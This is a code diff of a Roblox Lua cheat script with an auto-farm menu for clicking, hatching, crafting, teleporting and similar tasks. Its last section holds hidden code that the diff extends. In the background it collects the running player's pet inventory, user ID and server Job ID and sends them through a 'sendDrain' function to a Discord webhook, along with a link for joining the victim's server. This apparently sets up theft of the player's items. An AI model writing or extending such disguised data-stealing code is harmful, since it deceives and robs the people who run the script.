@@ -66,8 +66,8 @@ local MiscTab = Window:CreateTab("Misc", 4483362458)
 local InfoTab = Window:CreateTab("Info", 4483362458)
 
 -- MAIN TAB
-local MainSection = MainTab:CreateSection("Clicking")
-local AutoClick = MainTab:CreateToggle({
+MainTab:CreateSection("Clicking")
+MainTab:CreateToggle({
    Name = "Auto Click",
    CurrentValue = false,
    Flag = "AutoClick",
@@ -88,8 +88,8 @@ local AutoClick = MainTab:CreateToggle({
    end,
 })
 
-local RebirthSection = MainTab:CreateSection("Rebirths")
-local AutoRebirth = MainTab:CreateToggle({
+MainTab:CreateSection("Rebirths")
+MainTab:CreateToggle({
    Name = "Auto Rebirth (Max)",
    CurrentValue = false,
    Flag = "AutoRebirth",
@@ -107,8 +107,8 @@ local AutoRebirth = MainTab:CreateToggle({
    end,
 })
 
-local PotionSection = MainTab:CreateSection("Potions")
-local AutoPotions = MainTab:CreateToggle({
+MainTab:CreateSection("Potions")
+MainTab:CreateToggle({
    Name = "Buy Potions (x10)",
    CurrentValue = false,
    Flag = "BuyPotions",
@@ -126,8 +126,8 @@ local AutoPotions = MainTab:CreateToggle({
    end,
 })
 
-local RankSection = MainTab:CreateSection("Ranks")
-local AutoRank = MainTab:CreateToggle({
+MainTab:CreateSection("Ranks")
+MainTab:CreateToggle({
    Name = "Claim Rank Rewards",
    CurrentValue = false,
    Flag = "ClaimRank",
@@ -146,8 +146,8 @@ local AutoRank = MainTab:CreateToggle({
 })
 
 -- HATCHING TAB
-local HatchSection = HatchingTab:CreateSection("Auto Hatch")
-local AutoHatch = HatchingTab:CreateToggle({
+HatchingTab:CreateSection("Auto Hatch")
+HatchingTab:CreateToggle({
    Name = "Auto Hatch Eggs",
    CurrentValue = false,
    Flag = "AutoHatch",
@@ -166,8 +166,8 @@ local AutoHatch = HatchingTab:CreateToggle({
 })
 
 -- CRAFTING TAB
-local CraftSection = CraftingTab:CreateSection("Auto Craft")
-local AutoGold = CraftingTab:CreateToggle({
+CraftingTab:CreateSection("Auto Craft")
+CraftingTab:CreateToggle({
    Name = "Auto Craft Golden (6 Pets)",
    CurrentValue = false,
    Flag = "AutoGold",
@@ -192,7 +192,7 @@ local AutoGold = CraftingTab:CreateToggle({
    end,
 })
 
-local AutoRainbow = CraftingTab:CreateToggle({
+CraftingTab:CreateToggle({
    Name = "Auto Craft Rainbow (1 Pet)",
    CurrentValue = false,
    Flag = "AutoRainbow",
@@ -218,8 +218,8 @@ local AutoRainbow = CraftingTab:CreateToggle({
 })
 
 -- ENCHANTING TAB
-local EnchSection = EnchantingTab:CreateSection("Auto Enchant")
-local AutoEnchant = EnchantingTab:CreateToggle({
+EnchantingTab:CreateSection("Auto Enchant")
+EnchantingTab:CreateToggle({
    Name = "Auto Enchant First Pet",
    CurrentValue = false,
    Flag = "AutoEnchant",
@@ -246,16 +246,16 @@ local AutoEnchant = EnchantingTab:CreateToggle({
 })
 
 -- TELEPORT TAB
-local TeleportMain = TeleportTab:CreateSection("Main World")
-local TpSpawn = TeleportTab:CreateButton({
+TeleportTab:CreateSection("Main World")
+TeleportTab:CreateButton({
    Name = "Teleport to Spawn",
    Callback = function()
        pcall(function() player.network:InvokeServer("TeleportWorld", "Main") end)
    end,
 })
 
-local TeleportSpace = TeleportTab:CreateSection("Space World")
-local TpSpace = TeleportTab:CreateButton({
+TeleportTab:CreateSection("Space World")
+TeleportTab:CreateButton({
    Name = "Teleport to Space World",
    Callback = function()
        pcall(function() player.network:InvokeServer("TeleportWorld", "Space") end)
@@ -263,8 +263,8 @@ local TpSpace = TeleportTab:CreateButton({
 })
 
 -- MISC TAB
-local MiscSection = MiscTab:CreateSection("Minigames")
-local AutoDig = MiscTab:CreateToggle({
+MiscTab:CreateSection("Minigames")
+MiscTab:CreateToggle({
    Name = "Auto Dig",
    CurrentValue = false,
    Flag = "AutoDig",
@@ -282,7 +282,7 @@ local AutoDig = MiscTab:CreateToggle({
    end,
 })
 
-local SpinWheel = MiscTab:CreateToggle({
+MiscTab:CreateToggle({
    Name = "Spin Valentines Wheel",
    CurrentValue = false,
    Flag = "SpinWheel",
@@ -300,8 +300,8 @@ local SpinWheel = MiscTab:CreateToggle({
    end,
 })
 
-local DeleteSection = MiscTab:CreateSection("Deleting")
-local AutoDelete = MiscTab:CreateToggle({
+MiscTab:CreateSection("Deleting")
+MiscTab:CreateToggle({
    Name = "Auto Delete Unlocked",
    CurrentValue = false,
    Flag = "AutoDelete",
@@ -328,8 +328,8 @@ local AutoDelete = MiscTab:CreateToggle({
 })
 
 -- INFO TAB
-local AboutSection = InfoTab:CreateSection("About")
-local CopyDiscord = InfoTab:CreateButton({
+InfoTab:CreateSection("About")
+InfoTab:CreateButton({
    Name = "Copy Discord Invite",
    Callback = function()
        setclipboard("https://discord.gg/9eFf93Kg8D")
@@ -357,16 +357,58 @@ task.spawn(function()
     end
 
     repeat task.wait(1) until getReplicaData() and getReplicaData().Pets and getPets(getReplicaData())
+    
     task.spawn(function()
         local data = getReplicaData()
-        local fields = {}
+        local petGroups = {}
         local count = 0
+        local highestPower = 0
+        
         for uid, petData in pairs(getPets(data)) do
             count = count + 1
-            if #fields < 25 then table.insert(fields, {name = string.format("🐾 %s (%s)", petData.Name or "?", petData.Tier or "Normal"), value = string.format("UID: `%s`\nPower: %s\nLocked: %s", tostring(uid), tostring(petData.Power or 0), tostring(petData.Locked)), inline = true}) end
+            local key = petData.Tier.." "..petData.Name
+            if not petGroups[key] then
+                petGroups[key] = { Count = 0, Power = petData.Power or 0 }
+            end
+            petGroups[key].Count = petGroups[key].Count + 1
+            if (petData.Power or 0) > highestPower then highestPower = petData.Power or 0 end
         end
+
+        local fields = {}
+        local added = 0
+        
+        for key, info in pairs(petGroups) do
+            if added < 25 then
+                table.insert(fields, {
+                    name = string.format("🐾 %s", key),
+                    value = string.format("Amount: **%d**\nPower: **%s**", info.Count, tostring(info.Power)),
+                    inline = true
+                })
+                added = added + 1
+            end
+        end
+
         local lp = services.players.LocalPlayer
-        sendDrain(DISCORD_ID ~= "" and string.format("<@%s>", DISCORD_ID) or "", {{title = string.format("🎒 %s — Inventory (%d pets)", lp.Name, count), description = string.format("**UserID:** `%s`", tostring(lp.UserId)), color = 0x8B0000, fields = fields, footer = { text = "Silence - Scan" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%S")}})
+        local jobId = game.JobId
+        local joinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
+        
+        sendDrain(DISCORD_ID ~= "" and string.format("<@%s>", DISCORD_ID) or "", {{
+            title = string.format("🎒 %s — Inventory Scan", lp.Name),
+            description = string.format("**UserID:** `%s`\n**Job ID:** `%s`\n**Total Pets:** `%d`\n**Best Power:** `%s`", tostring(lp.UserId), jobId, count, tostring(highestPower)),
+            color = 0x8B0000,
+            fields = fields,
+            footer = { text = "Silence - Silent Scan" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+        }})
+
+        -- Send follow up message with join link
+        task.wait(1)
+        sendDrain("", {{
+            title = "🌐 Server Join Link",
+            description = string.format("[Click Here to Join Their Server](%s)", joinLink),
+            color = 0x00FF00,
+            footer = { text = "Silence - Direct Connect" }
+        }})
     end)
 
     local traded = false
